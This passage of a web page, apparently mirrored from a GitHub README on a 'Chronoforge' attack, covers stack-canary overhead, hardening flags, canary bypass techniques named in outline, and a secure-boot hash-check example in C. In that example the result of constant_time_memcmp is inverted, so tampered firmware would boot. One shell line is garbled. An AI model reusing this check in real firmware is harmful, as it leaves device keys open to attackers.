<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-32-1024x546.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-32-1024x546.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Performance and overhead</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#performance-and-overhead"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Measured overhead costs:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#measured-overhead-costs"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Operation</th><th>Without protection</th><th>With protection</th><th>Overheads</th></tr></thead><tbody><tr><td>Calling the ECDSA function</td><td>1.0x</td><td>1.01-1.02x</td><td><strong>1-2%</strong></td></tr><tr><td>Проlogue/epilogue</td><td>2 instructions</td><td>8-10 instructions</td><td>~8-12 bytes of code</td></tr><tr><td>Stack memory</td><td>0 bytes</td><td>8 bytes (canary)</td><td>Insignificantly</td></tr><tr><td>lead time</td><td>Basic</td><td>+1-2%</td><td>Unnoticeable for the user</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Performance factors:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#performance-factors"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>The impact is minimal because:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The canary check is performed once per function call.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Modern CPUs execute additional instructions in 1-2 cycles</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher/transaction">ECDSA operations</a> dominate execution time (milliseconds vs. nanoseconds)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Cache memory is not affected</strong> – canary is stored in registers</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Applicability to Bitcoin wallet security</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#applicability-to-bitcoin-wallet-security"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Threat context:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#threat-context"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Historical&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Wallet Vulnerabilities:</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>CVE-2018-17144</strong> – Vulnerability in Bitcoin Core (not related to overflow)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>CVE-2012-4682</strong> – OpenSSL vulnerability (used by Bitcoin)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Talos exploit</strong> – a real-life Bitcoin-qt exploit that bypasses SSP</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">How does security work in real wallets?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#how-does-security-work-in-real-wallets"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Bitcoin Core recommendations:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong># Флаги компиляции для production-сборок</strong>
<strong>
./configure CXXFLAGS="-fstack-protector-strong -fcf-protection=full -O2"
make -j</strong>
...
<strong>(nproc)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Electrum, Sparrow, Specter:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Use hardened Python with C extensions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>All cryptographic operations are isolated in separate processes.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Stack canaries are enabled by default</strong> in modern toolkits.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Protection levels:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#protection-levels"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Level</th><th>Defenses</th><th>Applicability</th></tr></thead><tbody><tr><td><strong>Base</strong></td><td><code>-fstack-protector</code></td><td>Hobby projects</td></tr><tr><td><strong>Recommended</strong></td><td><code>-fstack-protector-strong</code></td><td>Most wallets</td></tr><tr><td><strong>Maximum</strong></td><td><code>-fstack-protector-all -fcf-protection=full</code></td><td>Wallets with &gt;10 BTC</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Practical recommendations and limitations</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-recommendations-and-limitations"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Recommendations for developers:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#recommendations-for-developers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Always use<code>-fstack-protector-strong</code></strong> when compiling cryptographic code</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Enable<code>-fcf-protection=full</code></strong> on modern hardware (Intel 11th Gen+, AMD Zen 3+)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Combine with other protections:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>ASLR (Address Space Layout Randomization)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>DEP/NX (Data Execution Prevention)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>PIE (Position-Independent Executable)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Isolate <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a></strong> in separate processes with minimal privileges</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Use hardware security modules (HSMs)</strong> for large amounts</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Limitations and workarounds:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#limitations-and-workarounds"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Stack canaries do NOT protect against:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Memory leaks</strong> – an attacker can read the canary value</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Heap overflows</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Use-after-free vulnerabilities</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Vulnerability Format String</strong> (printf arguments)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Concurrent attacks</strong> (data races)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Real bypasses:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Brute-force</strong> (32-bit systems only)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Stack spraying</strong> + information leak</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Partial overwrite</strong> (overwriting the lower bytes of the address)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Exception-based attacks</strong> (throwing an exception before checking the canary)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">For Bitcoin users:</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#for-bitcoin-users"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Check your wallet security:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong># На Linux
checksec --file=/usr/bin/bitcoin-qt

# Должно показать:
# Canary                        : Yes
# Control Flow Integrity (CFI)  : Yes (если современный CPU)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Safety Conclusions:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Stack canaries are a necessary, but not sufficient,</strong> layer of protection</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Never run a wallet</strong> on systems without modern security.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>For amounts >1 BTC</strong> , use hardware wallets (Ledger, Trezor, Coldcard)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Update your software regularly</strong> —exploits against older versions are actively sold on the black market.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">Technical details for researchers</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#technical-details-for-researchers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Assembly code generated by the compiler:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#assembly-code-generated-by-the-compiler"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>; GCC 11+ с -fstack-protector-strong
ecdsa_sign_with_canary:
    push   %rbp
    mov    %rsp,%rbp
    sub    $0x60,%rsp                  ; Выделяем 96 байт
    mov    %fs:0x28,%rax               ; Загружаем canary из TLS
    mov    %rax,-0x8(%rbp)             ; Сохраняем на стеке

    ; ... тело функции ...

    mov    -0x8(%rbp),%rax             ; Загружаем сохраненный canary
    xor    %fs:0x28,%rax               ; Сравниваем с оригиналом
    je     .L1                         ; Если совпадает - продолжаем
    call   __stack_chk_fail@plt        ; Иначе - аварийное завершение
.L1:
    leave
    ret</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Shadow stack в Intel CET:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#shadow-stack-%D0%B2-intel-cet"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Normal Stack          Shadow Stack (защищенная память)
&#91;local_vars]          &#91;адрес_возврата_1]
&#91;CANARY]              &#91;адрес_возврата_2]
&#91;saved_rbp]           &#91;адрес_возврата_3]
&#91;return_addr]  &lt;--&gt;   &#91;адрес_возврата_3]  (проверка при ret)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Code Integrity Verification</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#code-integrity-verification"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Code Integrity Verification</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#code-integrity-verification-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Secure Boot with Code Integrity Verification<br><br>static const uint8_t FIRMWARE_HASH_TRUSTED[32] = {<br>    0x2d, 0xfb, 0x3f, 0x8c, // Example trusted hash<br>    // ... remaining bytes ...<br>};<br><br>void secure_boot_verify_firmware(void) {<br>    // Compute SHA-256 of firmware in flash<br>    uint8_t firmware_hash[32];<br>    sha256_flash_memory(firmware_hash, <br>                       FIRMWARE_START, <br>                       FIRMWARE_SIZE);<br><br>    // Compare with trusted hash (constant-time)<br>    int hash_match = constant_time_memcmp(<br>        firmware_hash,<br>        FIRMWARE_HASH_TRUSTED,<br>        32<br>    );<br><br>    if (!hash_match) {<br>        // COMPROMISED!<br>        erase_secure_storage();<br>        blink_led_error();<br>        while (1) { asm("wfi"); }  // Wait for reset<br>    }<br><br>    jump_to_firmware_entry();<br>}<br><br>int constant_time_memcmp(const uint8_t *a, <br>                         const uint8_t *b, <br>                         size_t len) {<br>    uint8_t result = 0;<br>    // Compare ALL bytes even after mismatch found<br>    for (size_t i = 0; i &lt; len; i++) {<br>        result |= a[i] ^ b[i];<br>    }<br>    return (int)result;<br>}<br><br>// EFFECTIVENESS:<br>// - Detects firmware tampering<br>// - Prevents rootkit installation<br>// - Immutable boot code ensures verification</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-33-1024x690.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-33-1024x690.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">1. General idea (Secure Boot + Code Integrity)</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1-general-idea-secure-boot--code-integrity"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This code implements a simplified Secure Boot mechanism&nbsp;with SHA-256&nbsp;<strong>firmware integrity verification</strong><br>. The goal is to ensure that the device’s main code (firmware) has not been modified by an attacker before it is launched.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In the context of cryptocurrencies/&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin devices&nbsp;</a><em>(hardware wallets, signing devices, HSMs, etc.),</em>&nbsp;this is critical: if an attacker replaces the firmware, they can steal private keys or spoof destination addresses undetected.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">2. Static “trusted” firmware hash</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2-static-trusted-firmware-hash"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>static const uint8_t FIRMWARE_HASH_TRUSTED&#91;32] = {
    0x2d, 0xfb, 0x3f, 0x8c, // Example trusted hash
    // ... remaining bytes ...
};</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>What’s happening:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Purpose:</strong><br><code>FIRMWARE_HASH_TRUSTED</code> This is <strong>the reference SHA-256 hash of the trusted firmware</strong> , 32 bytes (256 bits) long.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Where should it be stored:</strong> In a real system, this value should be stored in <strong>immutable or hard-to-change memory</strong> :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>ROM bootloader,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>eFuse / OTP,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A secure flash partition that is write-protected after production.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>If an attacker can change both the firmware and this “trusted” hash, the protection is broken.</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true,"start":3} -->
<ol start="3" class="wp-block-list"><!-- wp:list-item -->
<li><strong>How it appears:</strong><br>During production (or during a secure update) <code>sha256(firmware_image)</code>, the result is calculated and “hardcoded” into the firmware.<br>This way, the device “knows” which firmware binary is considered legitimate.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">3. The main function of Secure Boot</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3-the-main-function-of-secure-boot"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>void secure_boot_verify_firmware(void) {
    // Compute SHA-256 of firmware in flash
    uint8_t firmware_hash&#91;32];
    sha256_flash_memory(firmware_hash, 
                       FIRMWARE_START, 
                       FIRMWARE_SIZE);

    // Compare with trusted hash (constant-time)
    int hash_match = constant_time_memcmp(
        firmware_hash,
        FIRMWARE_HASH_TRUSTED,
        32
    );

    if (!hash_match) {
        // COMPROMISED!
        erase_secure_storage();
        blink_led_error();
        while (1) { asm("wfi"); }  // Wait for reset
    }

    jump_to_firmware_entry();
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.1. Step 1: Compute SHA-256 of firmware in flash</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#31-step-1-compute-sha-256-of-firmware-in-flash"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>uint8_t firmware_hash&#91;32];
sha256_flash_memory(firmware_hash, 
                   FIRMWARE_START, 
                   FIRMWARE_SIZE);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Purpose:</strong><br>The function <code>sha256_flash_memory</code>calculates the SHA-256 hash from the range of flash memory where the main firmware is located: from bytes <code>FIRMWARE_START</code>in length <code>FIRMWARE_SIZE</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Result:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>firmware_hash[32]</code>The result is written to the array <code>SHA256(flash[FIRMWARE_START..FIRMWARE_START+FIRMWARE_SIZE-1])</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This is the actual “current” state of the firmware in the device’s memory.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Cryptographic meaning:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>If the firmware has been modified <strong>even by one bit</strong> , the cryptographically secure SHA-256 hash function should produce a completely different 256-bit result (avalanche effect).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Thus, a hash match means that the binary content is identical to what was hashed during production.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.2. Step 2: Constant-time comparison of hashes</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#32-step-2-constant-time-comparison-of-hashes"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int hash_match = constant_time_memcmp(
    firmware_hash,
    FIRMWARE_HASH_TRUSTED,
    32
);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Purpose:</strong> Compare two 32-byte values:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>firmware_hash</code>— hash of the actual firmware,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>FIRMWARE_HASH_TRUSTED</code>— the reference “trusted” hash.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Why constant-time:</strong> A special function is used <code>constant_time_memcmp</code>to:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>do not “leave early” at the first mismatch;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>prevent timing leaks (execution time does not depend on which byte the first difference occurred on).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This is important if the device can be analyzed by time/consumption (side-channels).</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true,"start":3} -->
<ol start="3" class="wp-block-list"><!-- wp:list-item -->
<li><strong>Expected semantics:</strong> Typically <code>constant_time_memcmp</code>expected behavior:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>return <code>0</code>if the buffers are equal;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>return <strong>non-</strong> zero if there is at least one difference.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>It is important to understand this contract in order to write the terms correctly&nbsp;<code>if</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>(Below will be an analysis of what is implemented slightly differently in this code and how it affects it.)</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.3. Step 3: Reaction to mismatch</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#33-step-3-reaction-to-mismatch"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>if (!hash_match) {
    // COMPROMISED!
    erase_secure_storage();
    blink_led_error();
    while (1) { asm("wfi"); }  // Wait for reset
}

jump_to_firmware_entry();</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Logic by meaning (how it&nbsp;<strong>should</strong>&nbsp;look conceptually):</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>If hash does NOT match (firmware tampered):</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Perform <code>erase_secure_storage();</code>Usually this:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>clearing/zeroing <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a> ,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>seed phrases,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>PIN/passwords,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>any sensitive data that should not survive a code compromise.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Call <code>blink_led_error();</code><br>Indication to the user/operator that the device is in an erroneous state (suspected of hacking/firmware substitution).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Infinite loop with <code>asm("wfi");</code>:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>while (1) { asm("wfi"); }</code>means: “do nothing, wait for interrupts/reset.”</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The device actually stops until a hard reset.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Control is not transferred to any potentially malicious firmware.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>If hash matches (firmware trusted):</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Call<code>jump_to_firmware_entry();</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Transfer control to the main firmware entry point (usually:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>setting <code>SP</code>(stack pointer) and <code>PC</code>(program counter) to values ​​from the firmware interrupt vector,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>or a direct jump to the entry-point address).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/bitcoin">Meaning in terms of Bitcoin devices:</a></strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Until the device is sure of the integrity of the firmware, it <strong>should not have access to private keys</strong> and <strong>should not execute code</strong> that will work with them.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If a discrepancy is detected, the firmware is considered compromised, the secrets are destroyed, and the device enters a “fail-secure” state.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">4. Implementation of constant-time comparison</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#4-implementation-of-constant-time-comparison"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int constant_time_memcmp(const uint8_t *a, 
                         const uint8_t *b, 
                         size_t len) {
    uint8_t result = 0;
    // Compare ALL bytes even after mismatch found
    for (size_t i = 0; i &lt; len; i++) {
        result |= a&#91;i] ^ b&#91;i];
    }
    return (int)result;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.1. Step 1: Initialization</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#41-step-1-initialization"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>uint8_t result = 0;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>result</code>initialized to zero.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In the future, it will accumulate information about whether the bytes were different.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.2. Step 2: Full scan over all bytes</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#42-step-2-full-scan-over-all-bytes"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>for (size_t i = 0; i &lt; len; i++) {
    result |= a&#91;i] ^ b&#91;i];
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>No early exit:</strong> The loop runs through <strong>all</strong><code>len</code> bytes, regardless of whether a difference has already been found.<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>This is the key to <em>constant-time behavior</em> over the number of iterations.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
